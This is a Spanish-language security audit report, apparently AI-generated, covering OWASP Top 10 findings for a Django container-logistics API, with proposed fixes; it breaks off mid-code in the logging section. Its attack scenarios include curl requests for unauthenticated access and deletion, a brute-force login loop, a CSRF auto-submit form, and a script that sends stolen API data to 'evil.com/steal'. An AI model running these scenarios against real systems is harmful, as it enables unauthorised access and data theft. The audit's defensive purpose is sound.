# 🔐 AUDITORÍA - FASE 6: SEGURIDAD PROFUNDA (OWASP TOP 10)

**Fecha**: 2025-10-10  
**Auditor**: GitHub Copilot  
**Alcance**: Auditoría exhaustiva de seguridad siguiendo OWASP Top 10 2021, análisis de autenticación, autorización, CSRF, XSS, SQL Injection, exposición de datos sensibles, configuraciones inseguras, dependencias vulnerables, logging inseguro

---

## 📊 RESUMEN EJECUTIVO

### Análisis OWASP Top 10 2021
- **A01: Broken Access Control**: 🔴 **CRÍTICO** - Sin control granular de permisos
- **A02: Cryptographic Failures**: 🟡 MODERADO - SECRET_KEY débil por defecto
- **A03: Injection**: 🟢 BUENO - ORM Django protege contra SQL Injection
- **A04: Insecure Design**: 🟡 MODERADO - Falta rate limiting
- **A05: Security Misconfiguration**: 🔴 **CRÍTICO** - DEBUG, CORS, permisos débiles en dev
- **A06: Vulnerable Components**: 🟢 BUENO - Dependencias actualizadas
- **A07: Authentication Failures**: 🟡 MODERADO - Sin rate limiting en login
- **A08: Software and Data Integrity**: 🟢 BUENO - Integridad correcta
- **A09: Security Logging**: 🟡 MODERADO - Logs pueden exponer info sensible
- **A10: Server-Side Request Forgery**: 🟢 BUENO - No aplica (no hay SSRF directo)

### Vulnerabilidades Críticas Encontradas
1. 🔴 **8 endpoints con `@csrf_exempt`** (identificados en Fase 4)
2. 🔴 **Sin throttling/rate limiting** (ataques de fuerza bruta posibles)
3. 🔴 **CORS_ALLOW_ALL_ORIGINS = True** en desarrollo (riesgo de fuga)
4. 🔴 **AllowAny permissions** en DEBUG=True (APIs sin protección en dev)
5. 🔴 **SECRET_KEY débil por defecto** (`django-insecure-change-me-in-production`)
6. 🟡 **Passwords hardcoded** en management commands (`PASSWORD = '1234'`)
7. 🟡 **Sin encabezados de seguridad HTTP** (CSP, Permissions-Policy)
8. 🟡 **Logs sin filtrado** de información sensible

### Veredicto General de Seguridad
🔴 **NECESITA ATENCIÓN URGENTE** - Sistema tiene bases sólidas (JWT, HTTPS en prod, validaciones Django), pero **falta protección contra ataques automatizados (rate limiting), control de permisos granular, y hay configuraciones peligrosas en desarrollo que podrían filtrarse a producción**.

---

## 1️⃣ A01: BROKEN ACCESS CONTROL (Control de Acceso Roto)

### 🔴 **CRÍTICO: Sin control granular de permisos**

```python
# ❌ config/settings.py (línea 169)
REST_FRAMEWORK = {
    'DEFAULT_PERMISSION_CLASSES': [
        # ← En producción: IsAuthenticated (correcto)
        # ← En desarrollo: AllowAny (PELIGROSO)
        'rest_framework.permissions.IsAuthenticated' if not DEBUG else 'rest_framework.permissions.AllowAny',
    ],
}
```

**Riesgos**:
- 🔴 **En desarrollo**: APIs completamente abiertas sin autenticación
- 🔴 **Si DEBUG=True queda en producción**: Sistema sin protección
- 🔴 **Sin roles**: Todos los usuarios autenticados tienen acceso total
- 🔴 **Sin control a nivel de objeto**: Usuario A puede editar datos de Usuario B

**Escenario de Ataque**:
```bash
# Si DEBUG=True en producción (por error):
curl http://soptraloc.onrender.com/api/v1/containers/
# ← Devuelve TODOS los contenedores SIN autenticación

# Usuario malicioso:
curl -X DELETE http://soptraloc.onrender.com/api/v1/containers/{uuid}/
# ← Elimina contenedores sin verificar permisos
```

**Solución**:
```python
# ✅ CORREGIR: config/settings.py

REST_FRAMEWORK = {
    'DEFAULT_PERMISSION_CLASSES': [
        'rest_framework.permissions.IsAuthenticated',  # ← SIEMPRE
        # NUNCA usar DEBUG condicional aquí
    ],
}

# ✅ Si necesitas endpoint público, hazlo explícito:
@api_view(['GET'])
@permission_classes([AllowAny])  # ← Explícito solo donde se necesite
def public_health_check(request):
    return Response({"status": "ok"})

# ✅ IMPLEMENTAR: Sistema de roles/permisos

# 1. Crear grupos (Django admin o fixtures)
from django.contrib.auth.models import Group

GRUPOS = {
    'admin': ['add', 'change', 'delete', 'view'],  # Todo
    'operador': ['add', 'change', 'view'],         # No eliminar
    'conductor': ['view', 'update_position'],      # Solo lectura + actualizar posición
    'cliente': ['view'],                            # Solo lectura
}

# 2. Permission classes personalizadas
# apps/core/permissions.py

from rest_framework import permissions

class IsAdminOrReadOnly(permissions.BasePermission):
    """Solo admins pueden editar, otros solo lectura"""
    def has_permission(self, request, view):
        if request.method in permissions.SAFE_METHODS:  # GET, HEAD, OPTIONS
            return request.user and request.user.is_authenticated
        # Métodos de escritura: solo admins
        return request.user and request.user.groups.filter(name='admin').exists()

class IsOwnerOrAdmin(permissions.BasePermission):
    """Solo el propietario o admin puede editar"""
    def has_object_permission(self, request, view, obj):
        # Admin puede todo
        if request.user.groups.filter(name='admin').exists():
            return True
        
        # Propietario puede sus propios objetos
        if hasattr(obj, 'owner_company'):
            user_company = getattr(request.user, 'company', None)
            return obj.owner_company == user_company
        
        if hasattr(obj, 'created_by'):
            return obj.created_by == request.user
        
        return False

class IsOperatorOrAdmin(permissions.BasePermission):
    """Solo operadores y admins"""
    def has_permission(self, request, view):
        if not request.user or not request.user.is_authenticated:
            return False
        return request.user.groups.filter(name__in=['admin', 'operador']).exists()

# 3. Aplicar en ViewSets
from apps.core.permissions import IsAdminOrReadOnly, IsOwnerOrAdmin

class ContainerViewSet(viewsets.ModelViewSet):
    queryset = Container.objects.all()
    serializer_class = ContainerSerializer
    permission_classes = [permissions.IsAuthenticated, IsOwnerOrAdmin]
    
    def get_permissions(self):
        """Permisos dinámicos según acción"""
        if self.action in ['create', 'update', 'partial_update']:
            return [permissions.IsAuthenticated(), IsOperatorOrAdmin()]
        elif self.action == 'destroy':
            return [permissions.IsAuthenticated(), IsAdminOrReadOnly()]
        return [permissions.IsAuthenticated(), IsOwnerOrAdmin()]
    
    def get_queryset(self):
        """Filtrar por empresa del usuario"""
        qs = super().get_queryset()
        user = self.request.user
        
        # Admin ve todo
        if user.groups.filter(name='admin').exists():
            return qs
        
        # Otros: solo su empresa
        user_company = getattr(user, 'company', None)
        if user_company:
            return qs.filter(owner_company=user_company)
        
        return qs.none()  # Sin empresa = sin datos
```

---

### 🔴 **CRÍTICO: Endpoints sin autorización a nivel de objeto**

```python
# ❌ apps/containers/views.py (líneas 200-250)
class ContainerViewSet(viewsets.ModelViewSet):
    """❌ Sin verificación de permisos a nivel de objeto"""
    queryset = Container.objects.all()
    serializer_class = ContainerSerializer
    permission_classes = [permissions.IsAuthenticated]  # ← Solo autenticación básica
    
    @action(detail=True, methods=['post'])
    def assign_driver(self, request, pk=None):
        """Asigna conductor a contenedor"""
        container = self.get_object()
        driver_id = request.data.get('driver_id')
        
        # ❌ FALTA: Verificar que el usuario tenga permiso para asignar conductor
        # ❌ FALTA: Verificar que el contenedor pertenezca a la empresa del usuario
        # ❌ FALTA: Verificar que el conductor pertenezca a la empresa
        
        driver = Driver.objects.get(id=driver_id)
        assignment = Assignment.objects.create(
            container=container,
            driver=driver,
            assigned_by=request.user
        )
        return Response({"success": True})
```

**Escenario de Ataque**:
```bash
# Usuario de Empresa A:
curl -X POST http://api.com/api/v1/containers/{uuid_empresa_B}/assign_driver/ \
  -H "Authorization: Bearer {token_empresa_A}" \
  -d '{"driver_id": {driver_empresa_A}}'

# ← Asigna conductor de Empresa A a contenedor de Empresa B
# ← Sin validación de permisos
```

**Solución**:
```python
# ✅ CORREGIR: Validar permisos a nivel de objeto

class ContainerViewSet(viewsets.ModelViewSet):
    """✅ Con autorización granular"""
    queryset = Container.objects.all()
    serializer_class = ContainerSerializer
    permission_classes = [permissions.IsAuthenticated, IsOwnerOrAdmin]
    
    @action(detail=True, methods=['post'])
    def assign_driver(self, request, pk=None):
        """Asigna conductor a contenedor"""
        container = self.get_object()  # ← Verifica permisos automáticamente (IsOwnerOrAdmin)
        driver_id = request.data.get('driver_id')
        
        # ✅ Validar que el conductor pertenezca a la empresa del usuario
        user_company = getattr(request.user, 'company', None)
        try:
            driver = Driver.objects.get(id=driver_id, company=user_company)
        except Driver.DoesNotExist:
            return Response(
                {"error": "Conductor no encontrado o no pertenece a su empresa"},
                status=status.HTTP_403_FORBIDDEN
            )
        
        # ✅ Validar que el contenedor pertenezca a la empresa del usuario
        if container.owner_company != user_company and not request.user.is_staff:
            return Response(
                {"error": "No tiene permiso para asignar conductor a este contenedor"},
                status=status.HTTP_403_FORBIDDEN
            )
        
        # ✅ Validar que el conductor esté disponible
        if driver.status != 'available':
            return Response(
                {"error": f"Conductor no disponible (estado: {driver.status})"},
                status=status.HTTP_400_BAD_REQUEST
            )
        
        assignment = Assignment.objects.create(
            container=container,
            driver=driver,
            assigned_by=request.user
        )
        
        return Response({
            "success": True,
            "assignment_id": assignment.id,
            "message": f"Conductor {driver.name} asignado a {container.container_number}"
        })
```

---

## 2️⃣ A02: CRYPTOGRAPHIC FAILURES (Fallos Criptográficos)

### 🟡 **PROBLEMA: SECRET_KEY débil por defecto**

```python
# ⚠️ config/settings.py (línea 12)
SECRET_KEY = config('SECRET_KEY', default='django-insecure-change-me-in-production')
```

**Riesgos**:
- 🟡 En desarrollo local: Secret key predecible
- 🔴 Si no se configura ENV: Producción usa default (vulnerable)
- 🔴 Tokens JWT firmados con SECRET_KEY débil pueden falsificarse

**Solución**:
```python
# ✅ CORREGIR: config/settings.py

import os
from decouple import config, UndefinedValueError

try:
    SECRET_KEY = config('SECRET_KEY')
except UndefinedValueError:
    if DEBUG:
        # En desarrollo: generar temporal (cambia cada reinicio - mejor para testing)
        SECRET_KEY = 'dev-secret-' + os.urandom(32).hex()
        print("⚠️  Usando SECRET_KEY temporal de desarrollo")
    else:
        # En producción: OBLIGATORIO en ENV
        raise RuntimeError(
            "❌ SECRET_KEY no configurada. "
            "Definir variable de entorno SECRET_KEY en producción."
        )

# ✅ Generar SECRET_KEY segura:
# python -c "import secrets; print(secrets.token_urlsafe(50))"
# Output: "zX9K8m...P3qL_wR" (copiar a .env)
```

---

### 🟢 **FORTALEZA: HTTPS y cookies seguras en producción**

```python
# ✅ config/settings_production.py (líneas 39-48)
SECURE_SSL_REDIRECT = True            # ← Redirige HTTP → HTTPS
SESSION_COOKIE_SECURE = True          # ← Cookies solo por HTTPS
CSRF_COOKIE_SECURE = True             # ← Token CSRF solo por HTTPS
SECURE_BROWSER_XSS_FILTER = True      # ← Filtro XSS del navegador
SECURE_CONTENT_TYPE_NOSNIFF = True    # ← Previene MIME sniffing
X_FRAME_OPTIONS = 'DENY'              # ← Previene clickjacking
SECURE_HSTS_SECONDS = 31536000        # ← HSTS 1 año
SECURE_HSTS_INCLUDE_SUBDOMAINS = True # ← HSTS en subdominios
SECURE_HSTS_PRELOAD = True            # ← HSTS preload list
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')  # ← Para Render.com
```

**Fortalezas**:
- ✅ Configuración HTTPS completa
- ✅ HSTS de 1 año con preload
- ✅ Cookies marcadas como `Secure`
- ✅ Protección contra clickjacking

---

## 3️⃣ A03: INJECTION (Inyección)

### 🟢 **FORTALEZA: Django ORM protege contra SQL Injection**

```python
# ✅ apps/containers/views.py
# Django ORM escapa automáticamente parámetros

# ✅ SEGURO:
containers = Container.objects.filter(
    container_number=request.GET.get('number')  # ← Django escapa automáticamente
)

# ✅ SEGURO:
containers = Container.objects.filter(
    status__in=request.GET.getlist('status')    # ← Escapado
)

# ✅ SEGURO con Q objects:
from django.db.models import Q
containers = Container.objects.filter(
    Q(status='PROGRAMADO') | Q(status='EN_RUTA')
)
```

**Fortalezas**:
- ✅ Todo el código usa Django ORM (sin SQL raw)
- ✅ Django escapa parámetros automáticamente
- ✅ No hay uso de `.raw()`, `.execute()`, ni f-strings en queries

---

### 🟡 **PRECAUCIÓN: Si en el futuro se usa SQL raw**

```python
# ❌ MAL: Concatenación vulnerable (NO existe actualmente, pero por prevención)
# DON'T DO THIS:
query = f"SELECT * FROM containers WHERE status = '{status}'"  # ← VULNERABLE
Container.objects.raw(query)

# ✅ BIEN: Usar parámetros:
query = "SELECT * FROM containers WHERE status = %s"
Container.objects.raw(query, [status])  # ← SEGURO
```

---

## 4️⃣ A04: INSECURE DESIGN (Diseño Inseguro)

### 🔴 **CRÍTICO: Sin rate limiting/throttling**

```python
# ❌ config/settings.py
REST_FRAMEWORK = {
    # ...
    # ❌ FALTA: 'DEFAULT_THROTTLE_CLASSES'
    # ❌ FALTA: 'DEFAULT_THROTTLE_RATES'
}

# ❌ apps/core/auth_views.py (línea 26)
@api_view(['POST'])
@permission_classes([AllowAny])
def get_token(request):
    """❌ Login sin rate limiting - vulnerable a fuerza bruta"""
    username = request.data.get('username')
    password = request.data.get('password')
    user = authenticate(username=username, password=password)
    # ...
```

**Escenario de Ataque**:
```bash
# Ataque de fuerza bruta:
for password in common_passwords:
    curl -X POST http://api.com/api/v1/auth/token/ \
      -d '{"username":"admin", "password":"'$password'"}'
    # ← Sin límite de intentos
```

**Solución**:
```python
# ✅ IMPLEMENTAR: Rate limiting global y específico

# 1. config/settings.py
REST_FRAMEWORK = {
    ...,
    'DEFAULT_THROTTLE_CLASSES': [
        'rest_framework.throttling.AnonRateThrottle',   # Anónimos
        'rest_framework.throttling.UserRateThrottle',   # Autenticados
    ],
    'DEFAULT_THROTTLE_RATES': {
        'anon': '100/hour',    # 100 requests/hora para anónimos
        'user': '1000/hour',   # 1000 requests/hora para autenticados
        'login': '5/minute',   # 5 intentos de login por minuto
    },
}

# 2. Throttle específico para login
# apps/core/throttling.py
from rest_framework.throttling import AnonRateThrottle

class LoginThrottle(AnonRateThrottle):
    """Máximo 5 intentos de login por minuto"""
    rate = '5/minute'
    scope = 'login'

# 3. Aplicar en login endpoint
# apps/core/auth_views.py
from apps.core.throttling import LoginThrottle

@api_view(['POST'])
@permission_classes([AllowAny])
@throttle_classes([LoginThrottle])  # ← Protección contra fuerza bruta
def get_token(request):
    """✅ Login con rate limiting"""
    username = request.data.get('username')
    password = request.data.get('password')
    
    if not username or not password:
        return Response({
            'error': 'Se requieren username y password'
        }, status=status.HTTP_400_BAD_REQUEST)
    
    user = authenticate(username=username, password=password)
    
    if user:
        refresh = RefreshToken.for_user(user)
        return Response({
            'access': str(refresh.access_token),
            'refresh': str(refresh),
            'user': {
                'id': user.id,
                'username': user.username,
                'email': user.email,
            }
        })
    else:
        # ✅ Mensaje genérico (no revelar si username existe)
        return Response({
            'error': 'Credenciales inválidas'  # ← NO decir "usuario no existe" ni "contraseña incorrecta"
        }, status=status.HTTP_401_UNAUTHORIZED)
```

---

### 🟡 **PROBLEMA: Sin protección contra timing attacks**

```python
# ⚠️ apps/core/auth_views.py
user = authenticate(username=username, password=password)
if user:
    # Success path (rápido)
    return Response({...})
else:
    # Failure path (podría ser más lento)
    return Response({'error': '...'})

# ← Atacante puede medir tiempo de respuesta para descubrir usernames válidos
```

**Solución**:
```python
# ✅ AGREGAR: Tiempo constante con rate limiting
import time
import random

@api_view(['POST'])
@permission_classes([AllowAny])
@throttle_classes([LoginThrottle])
def get_token(request):
    """✅ Con protección timing attack"""
    start_time = time.time()
    
    username = request.data.get('username')
    password = request.data.get('password')
    
    user = authenticate(username=username, password=password)
    
    # ✅ Agregar delay aleatorio (simular tiempo constante)
    min_response_time = 0.5  # 500ms mínimo
    elapsed = time.time() - start_time
    if elapsed < min_response_time:
        time.sleep(min_response_time - elapsed + random.uniform(0, 0.1))
    
    if user:
        refresh = RefreshToken.for_user(user)
        return Response({
            'access': str(refresh.access_token),
            'refresh': str(refresh),
        })
    else:
        return Response({
            'error': 'Credenciales inválidas'
        }, status=status.HTTP_401_UNAUTHORIZED)
```

---

## 5️⃣ A05: SECURITY MISCONFIGURATION (Configuración Insegura)

### 🔴 **CRÍTICO: CORS abierto en desarrollo**

```python
# ❌ config/settings.py (líneas 193-195)
if DEBUG:
    CORS_ALLOW_ALL_ORIGINS = True      # ← CUALQUIER origen puede hacer requests
    CORS_ALLOW_CREDENTIALS = True      # ← Permite envío de cookies/tokens
```

**Riesgos**:
- 🔴 **En desarrollo**: Sitios maliciosos pueden hacer requests a tu API local
- 🔴 **Si DEBUG=True en producción**: API abierta a ataques CORS
- 🔴 **Con credenciales**: Tokens/cookies pueden ser robados

**Escenario de Ataque**:
```html
<!-- Sitio malicioso: evil.com -->
<script>
// Si usuario tiene localhost:8000 corriendo con DEBUG=True:
fetch('http://localhost:8000/api/v1/containers/', {
    method: 'GET',
    credentials: 'include'  // ← Envía cookies/JWT
})
.then(r => r.json())
.then(data => {
    // ← Roba todos los contenedores
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
```

**Solución**:
```python
# ✅ CORREGIR: config/settings.py

# CORS settings - NUNCA usar ALLOW_ALL
CORS_ALLOWED_ORIGINS = [
    "http://localhost:3000",      # Frontend React/Vue local
    "http://localhost:8080",      # Frontend alternativo
    "https://soptraloc-app.vercel.app",  # Frontend en producción
]

# ❌ NUNCA EN PRODUCCIÓN:
# CORS_ALLOW_ALL_ORIGINS = True

# Si necesitas múltiples orígenes en desarrollo:
if DEBUG:
    CORS_ALLOWED_ORIGINS.extend([
        "http://127.0.0.1:3000",
        "http://192.168.1.100:3000",  # IP local
    ])

CORS_ALLOW_CREDENTIALS = True  # ← OK, pero con orígenes específicos
```

---

### 🔴 **CRÍTICO: 8 endpoints con @csrf_exempt**

```python
# ❌ apps/drivers/views.py (identificados en Fase 4)
@csrf_exempt  # ← Línea 375
def assign_driver(request):
    """❌ Sin protección CSRF"""
    ...

@csrf_exempt  # ← Línea 424
def update_position(request):
    """❌ Sin protección CSRF"""
    ...

@csrf_exempt  # ← Línea 490
def start_route(request):
    """❌ Sin protección CSRF"""
    ...

@csrf_exempt  # ← Línea 818
def end_route(request):
    """❌ Sin protección CSRF"""
    ...
```

**Escenario de Ataque CSRF**:
```html
<!-- Sitio malicioso: evil.com -->
<form action="http://soptraloc.com/api/v1/drivers/assign/" method="POST" id="csrf-attack">
    <input name="driver_id" value="123">
    <input name="container_id" value="abc-xyz">
</form>
<script>
// Si usuario está logueado en soptraloc.com:
document.getElementById('csrf-attack').submit();
// ← Asigna conductor sin consentimiento del usuario
</script>
```

**Solución**:
```python
# ✅ ELIMINAR: Todos los @csrf_exempt

# Opción 1: Usar DRF (maneja CSRF automáticamente con JWT)
from rest_framework.decorators import api_view
from rest_framework.permissions import IsAuthenticated

@api_view(['POST'])
@permission_classes([IsAuthenticated])
def assign_driver(request):
    """✅ Con autenticación JWT (sin CSRF porque es stateless)"""
    ...

# Opción 2: Si necesitas session authentication, usar ensure_csrf_cookie
from django.views.decorators.csrf import ensure_csrf_cookie
from django.contrib.auth.decorators import login_required

@ensure_csrf_cookie
@login_required
def assign_driver(request):
    """✅ Con protección CSRF"""
    if request.method == 'POST':
        # Django verifica CSRF token automáticamente
        ...
```

---

### 🟡 **PROBLEMA: Passwords hardcoded en management commands**

```python
# ⚠️ apps/core/management/commands/force_create_admin.py (línea 18)
PASSWORD = '1234'  # ← Password débil hardcoded

# ⚠️ apps/core/management/commands/load_sample_data.py (línea 148)
user.set_password('conductor123')  # ← Password predecible
```

**Riesgos**:
- 🟡 Passwords débiles para usuarios de prueba
- 🟡 Si estos comandos se ejecutan en producción, crean usuarios vulnerables

**Solución**:
```python
# ✅ CORREGIR: Usar passwords aleatorias o desde ENV

# apps/core/management/commands/force_create_admin.py
import secrets
from decouple import config

class Command(BaseCommand):
    def handle(self, *args, **options):
        USERNAME = 'admin'
        EMAIL = 'admin@soptraloc.com'
        
        # ✅ Password desde ENV o generada aleatoria
        PASSWORD = config('ADMIN_PASSWORD', default=None)
        
        if not PASSWORD:
            # Generar password aleatoria
            PASSWORD = secrets.token_urlsafe(16)
            self.stdout.write(self.style.WARNING(
                f"⚠️  Password generada aleatoriamente: {PASSWORD}"
            ))
            self.stdout.write(self.style.WARNING(
                "   Guarda esta password de forma segura!"
            ))
        
        with transaction.atomic():
            User.objects.filter(username=USERNAME).delete()
            user = User.objects.create_superuser(
                username=USERNAME,
                email=EMAIL,
                password=PASSWORD
            )
            self.stdout.write(self.style.SUCCESS("✅ Superusuario creado"))

# ✅ Para sample data en DESARROLLO:
if settings.DEBUG:
    # OK usar passwords simples solo en desarrollo
    user.set_password('conductor123')
else:
    # En producción: NO crear usuarios de prueba
    raise CommandError("Este comando solo puede ejecutarse en desarrollo")
```

---

### 🟡 **PROBLEMA: Sin encabezados de seguridad HTTP adicionales**

```python
# ⚠️ Faltan headers de seguridad modernos:
# - Content-Security-Policy (CSP)
# - Permissions-Policy
# - Referrer-Policy
```

**Solución**:
```python
# ✅ AGREGAR: Middleware de seguridad adicional

# apps/core/middleware.py
class SecurityHeadersMiddleware:
    """Agrega headers de seguridad HTTP"""
    def __init__(self, get_response):
        self.get_response = get_response
    
    def __call__(self, request):
        response = self.get_response(request)
        
        # Content Security Policy
        response['Content-Security-Policy'] = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
            "font-src 'self' https://fonts.gstatic.com; "
            "img-src 'self' data: https:; "
            "connect-src 'self' https://api.mapbox.com;"
        )
        
        # Permissions Policy (antes Feature-Policy)
        response['Permissions-Policy'] = (
            "geolocation=(self), "
            "microphone=(), "
            "camera=()"
        )
        
        # Referrer Policy
        response['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        
        # X-Content-Type-Options ya configurado en settings_production
        # X-Frame-Options ya configurado
        
        return response

# config/settings.py
MIDDLEWARE = [
    ...
    'apps.core.middleware.SecurityHeadersMiddleware',  # ← Agregar
]
```

---

## 6️⃣ A06: VULNERABLE AND OUTDATED COMPONENTS

### 🟢 **FORTALEZA: Dependencias actualizadas**

```python
# ✅ requirements.txt (verificadas 2025-10-10)
Django==5.2.6                      # ✅ Última versión (2025)
djangorestframework==3.16.1        # ✅ Última versión
django-cors-headers==4.9.0         # ✅ Última versión
djangorestframework-simplejwt==5.5.1  # ✅ Última versión
psycopg2-binary==2.9.9             # ✅ Última versión
gunicorn==23.0.0                   # ✅ Última versión
celery==5.4.0                      # ✅ Última versión
redis==5.2.0                       # ✅ Última versión
Pillow==10.4.0                     # ✅ Última versión (con security fixes)
requests==2.32.3                   # ✅ Última versión
openpyxl==3.1.2                    # ✅ Última versión
pandas==2.2.3                      # ✅ Última versión
numpy==2.1.3                       # ✅ Última versión
scikit-learn==1.5.2                # ✅ Última versión
```

**Fortalezas**:
- ✅ Todas las dependencias críticas están actualizadas
- ✅ Django 5.2.6 tiene los últimos security patches
- ✅ No se encontraron CVE conocidos en las versiones actuales

---

### 🟡 **RECOMENDACIÓN: Automatizar auditoría de dependencias**

```bash
# ✅ AGREGAR: GitHub Actions para auditoría automática

# .github/workflows/security.yml
name: Security Audit

on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: '0 0 * * 1'  # Cada lunes

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.12'
      
      - name: Install dependencies
        run: |
          pip install safety bandit
      
      - name: Check for known vulnerabilities
        run: safety check --file requirements.txt
      
      - name: Run Bandit security linter
        run: bandit -r soptraloc_system/ -ll
      
      - name: Check outdated packages
        run: pip list --outdated
```

---

## 7️⃣ A07: IDENTIFICATION AND AUTHENTICATION FAILURES

### 🟡 **PROBLEMA: Sin rate limiting en login (ya cubierto en A04)**

Ver sección A04 para solución completa.

---

### 🟢 **FORTALEZA: Validación de passwords robusta**

```python
# ✅ config/settings.py (líneas 122-134)
AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]
```

**Fortalezas**:
- ✅ Contraseña no puede ser similar al username
- ✅ Longitud mínima configurada
- ✅ Rechaza contraseñas comunes (lista de 20,000 passwords débiles)
- ✅ No permite passwords completamente numéricos

---

### 🟢 **FORTALEZA: JWT con tiempos de expiración adecuados**

```python
# ✅ config/settings_production.py (líneas 214-216)
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(hours=2),      # ← Corto para APIs
    'REFRESH_TOKEN_LIFETIME': timedelta(days=7),      # ← 7 días
    'ROTATE_REFRESH_TOKENS': True,                    # ← Rota al refrescar
}
```

**Fortalezas**:
- ✅ Access token de 2 horas (corto, minimiza riesgo si es robado)
- ✅ Refresh token de 7 días (balance seguridad/UX)
- ✅ Rotación de refresh tokens (invalida anteriores)

---

### 🟡 **MEJORA: Agregar logout con blacklist de tokens**

```python
# ✅ AGREGAR: Blacklist de JWT tokens

# config/settings.py
INSTALLED_APPS = [
    ...
    'rest_framework_simplejwt.token_blacklist',  # ← Agregar
]

SIMPLE_JWT = {
    ...,
    'ROTATE_REFRESH_TOKENS': True,
    'BLACKLIST_AFTER_ROTATION': True,  # ← Agregar a blacklist al rotar
    'UPDATE_LAST_LOGIN': True,         # ← Actualizar last_login
}

# python manage.py migrate token_blacklist

# apps/core/auth_views.py
from rest_framework_simplejwt.tokens import RefreshToken

@api_view(['POST'])
@permission_classes([IsAuthenticated])
def logout(request):
    """✅ Logout con invalidación de token"""
    try:
        refresh_token = request.data.get('refresh')
        if refresh_token:
            token = RefreshToken(refresh_token)
            token.blacklist()  # ← Agregar a blacklist
        return Response({"message": "Logout exitoso"}, status=status.HTTP_200_OK)
    except Exception as e:
        return Response({"error": "Token inválido"}, status=status.HTTP_400_BAD_REQUEST)
```

---

## 8️⃣ A08: SOFTWARE AND DATA INTEGRITY FAILURES

### 🟢 **FORTALEZA: Sin deserialización insegura**

```python
# ✅ Celery usa JSON serializer (seguro)
# config/settings.py (líneas 200-202)
CELERY_ACCEPT_CONTENT = ['application/json']  # ← Solo JSON (NO pickle)
CELERY_TASK_SERIALIZER = 'json'               # ← JSON (seguro)
CELERY_RESULT_SERIALIZER = 'json'             # ← JSON (seguro)
```

**Fortalezas**:
- ✅ Celery configurado con JSON (no pickle vulnerable)
- ✅ No se encontró uso de `pickle.load()` en el código
- ✅ No se encontró uso de `yaml.load()` (debería ser `yaml.safe_load()`)

---

## 9️⃣ A09: SECURITY LOGGING AND MONITORING FAILURES

### 🟡 **PROBLEMA: Logs pueden exponer información sensible**

```python
# ⚠️ config/settings.py (líneas 204-228)
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'verbose': {
            'format': '{levelname} {asctime} {module} {process:d} {thread:d} {message}',
        },
    },
    'handlers': {
        'file': {
            'level': 'INFO',
            'class': 'logging.FileHandler',
            'filename': BASE_DIR / 'logs' / 'django.log',  # ← Archivo local
        },
        'console': {
            'level': 'DEBUG',  # ← DEBUG en desarrollo
        },
    },
}
```

**Riesgos**:
- 🟡 Logs pueden contener passwords, tokens, datos sensibles
- 🟡 Logs en archivo local (sin rotación configurada)
- 🟡 DEBUG level puede loggear requests completos

**Solución**:
```python
# ✅ AGREGAR: Filtros de sanitización de logs

# apps/core/logging_filters.py
import re

class SensitiveDataFilter(logging.Filter):
    """Filtra datos sensibles de logs"""
    
    SENSITIVE_PATTERNS = [
        (r'"password":\s*"[^"]*"', '"password": "***"'),
        (r'"token":\s*"[^"]*"', '"token": "***"'),
        (r'"api_key":\s*"[^"]*"', '"api_key": "***"'),
        (r'"secret":\s*"[^"]*"', '"secret": "***"'),
        (r'Authorization:\s*Bearer\s+[\w\.\-]+', 'Authorization: Bearer ***'),
        (r'password=[\w]+', 'password=***'),
    ]
    
    def filter(self, record):
        if isinstance(record.msg, str):
            for pattern, replacement in self.SENSITIVE_PATTERNS:
                record.msg = re.sub(pattern, replacement, record.msg, flags=re.IGNORECASE)
        return True

# config/settings.py
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'filters': {
        'sensitive_data': {
            '()': 'apps.core.logging_filters.SensitiveDataFilter',
        },
    },
    'formatters': {
        'verbose': {
            'format': '{levelname} {asctime} {module} {message}',
            'style': '{',
        },
    },
    'handlers': {
        'file': {
            'level': 'INFO',
            'class': 'logging.handlers.RotatingFileHandler',  # ← Rotación
            'filename': BASE_DIR / 'logs' / 'django.log',
            'maxBytes': 10 * 1024 * 1024,  # ← 10MB
            'backupCount': 5,               # ← 5 archivos de backup
            'formatter': 'verbose',
            'filters': ['sensitive_data'],  # ← Filtro de datos sensibles
        },
        'console': {
            'level': 'INFO' if not DEBUG else 'DEBUG',
            'class': 'logging.StreamHandler',
            'formatter': 'verbose',
            'filters': ['sensitive_data'],
        },
    },
    'root': {
        'handlers': ['console', 'file'],
        'level': 'INFO',
    },
    'loggers': {
        'django.request': {
            'handlers': ['file'],
            'level': 'WARNING',  # ← Solo warnings/errors de requests
            'propagate': False,
        },
        'apps': {
            'handlers': ['console', 'file'],
            'level': 'INFO',
            'propagate': False,
        },
    },
}
```

---

### 🟡 **PROBLEMA: Sin monitoreo de eventos de seguridad**

```python
# ⚠️ FALTA: Logging de eventos de seguridad críticos
# - Intentos de login fallidos
# - Cambios de permisos
# - Accesos denegados
# - Modificaciones de datos sensibles
```

**Solución**:
```python
# ✅ AGREGAR: Auditoría de eventos de seguridad

# apps/core/audit.py
import logging

security_logger = logging.getLogger('security')

class SecurityAuditMiddleware:
    """Audita eventos de seguridad"""
    def __init__(self, get_response):
        self.get_response = get_response
    
    def __call__(self, request):
        response = self.get_response(request)
        
        # Log de intentos de autenticación fallidos
        if request.path.startswith('/api/v1/auth/') and response.status_code == 401:
            security_logger.warning(
                f"Failed authentication attempt",
                extra={
                    'ip': request.META.get('REMOTE_ADDR'),
                    'user_agent': request.META.get('HTTP_USER_AGENT'),
                    'path': request.path,
                    'username': request.data.get('username') if hasattr(request, 'data') else None,
